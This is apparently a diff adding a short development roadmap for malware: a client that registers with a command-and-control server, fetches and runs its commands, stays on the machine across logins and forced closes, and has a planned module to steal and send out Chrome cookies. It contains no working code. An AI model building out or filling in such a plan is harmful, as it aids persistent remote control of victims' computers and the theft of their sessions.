@@ -1,0 +1,28 @@
+PLANS:
+
+00. Generate AgentID per executable so we dont have to access any outside data
+
+0. Report to http(s) server
+    a. Server side started
+    b. Client implementation needed
+
+1. Retrieve & Execute commands from C&C
+    a. Server side started
+    b. Client implementation needed
+
+2. Startup on user login
+    a. Use task manager startup location, Honest?
+    b. Hasnt been started
+
+3. Startup again when process is force closed
+    a. Task Scheduler
+        OR
+    b. Multi Processing
+        OR
+    c. Both
+
+    aa. Hasnt been started
+
+4. Modules
+    a. Chrome Cookie Steal & Submit
+        aa. Hasnt be started
